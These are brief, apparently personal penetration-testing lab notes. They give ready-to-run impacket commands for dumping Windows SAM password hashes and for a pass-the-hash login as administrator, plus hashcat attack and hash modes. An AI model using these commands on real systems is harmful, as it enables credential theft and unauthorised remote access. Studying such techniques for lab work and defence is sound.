# Windows
These attacks can be involved in [[Windows Escalation Techniques]]

We need a copy of system.hive and sam.hive registry to dump hashes
## Dumping SAM hashes
```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

## Pass-the-Hash
```bash
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
```

# Linux
`hashid` or `hash-identifier` can be used to identify unknown hash types

## Hashcat
`-a 0` is straight attack
`-a 3` is brute force

### Common hashes
| Hash Mode | Description |
| --------- | ----------- |
| `-m 0`    | MD5         |
| `-m 100`  | SHA-1       |
| `-m 1000` | NTLM        |
| `-m 5600` | NetNTLMv2   |
